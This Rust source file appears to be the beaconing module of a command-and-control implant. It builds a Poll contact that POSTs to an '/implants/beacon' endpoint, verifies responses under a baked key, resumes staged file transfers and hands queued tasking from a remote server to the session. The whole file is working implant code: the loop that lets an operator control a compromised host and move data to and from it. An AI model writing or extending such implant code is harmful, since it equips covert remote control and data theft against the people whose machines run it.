use std::io::Read;

use prost::Message;

use super::{accept_tasking, Contact};
use crate::error::ContactError;
use crate::profile::Profile;
use crate::session::{Attempt, Session};
use crate::wire::{Frame, StagedChunk};

/// The envelope POST cycle (architecture.md Sec 8): one POST to
/// /implants/beacon is one poll contact. The request body carries the
/// handshake, the staged demands at their current seams, and the accumulated
/// batch; the response carries the handshake answer, the staged chunk runs
/// answering those demands, then queued tasking. The batch leaves only after
/// a processed response, so a failed POST re-sends it verbatim; a staged
/// transfer's held bytes survive the failure on the session, so its next
/// demand resumes instead of restarting.
pub struct Poll {
    url: String,
    agent: ureq::Agent,
}

impl Poll {
    pub fn new(dial: &str, profile: &Profile) -> Poll {
        Poll {
            agent: crate::transport::build_agent(dial, profile, profile.request_timeout_seconds),
            url: dial.to_string(),
        }
    }
}

impl Contact for Poll {
    fn attempt(&mut self, session: &mut Session) -> Result<Attempt, ContactError> {
        // Channel output produced since the last cycle rides this request --
        // the poll discipline's delivery edge.
        session.drain_channels();
        let demands = session.staged_demands();
        let batch = session.outbox.batch();
        let mut frames = Vec::with_capacity(1 + demands.len() + batch.len());
        frames.push(session.handshake_frame());
        frames.extend(demands);
        frames.extend(batch.iter().cloned());
        let (body, content_type) = session.encode_outgoing(&frames);

        let response = self
            .agent
            .post(&self.url)
            .set("Content-Type", content_type)
            .send_bytes(&body)?;
        let status = response.status();
        let mut bytes = Vec::new();
        response
            .into_reader()
            .take(64 << 20)
            .read_to_end(&mut bytes)?;
        if status != 200 {
            return Err(ContactError::Transport(format!("status {status}")));
        }
        let inbound = session
            .decode_incoming(&bytes)
            .ok_or(ContactError::Protocol(
                "the contact response did not verify under the baked key",
            ))?;
        let first = inbound.first().ok_or(ContactError::Protocol(
            "the contact response carried no frames",
        ))?;
        let (acks, attempt) = session
            .handshake_answered(first)
            .map_err(ContactError::Protocol)?;
        if let Attempt::Refused = attempt {
            return Ok(attempt);
        }

        // The batch crossed: its frames are delivered, and this cycle's
        // demands are answered below.
        session.outbox.batch_crossed(batch.len());
        accept_staged(session, &inbound);
        accept_tasking(session, &inbound[1..], acks);
        // Echoes the channel input just routed may already have produced
        // output; it queues now and rides the next cycle.
        session.drain_channels();
        session.staged_cycle_end();
        Ok(Attempt::Crossed)
    }
}

/// The staged half of a poll response: every chunk run the response carries,
/// routed by task id into the session's transfer state -- placement, resume
/// bookkeeping, and the terminal dispatch live there, shared with every
/// other carriage (ADR-010).
pub fn accept_staged(session: &mut Session, inbound: &[Frame]) {
    for frame in inbound.iter().skip(1) {
        if let Ok(chunk) = StagedChunk::decode(frame.payload.as_ref()) {
            session.accept_staged_chunk(&chunk);
        }
    }
}
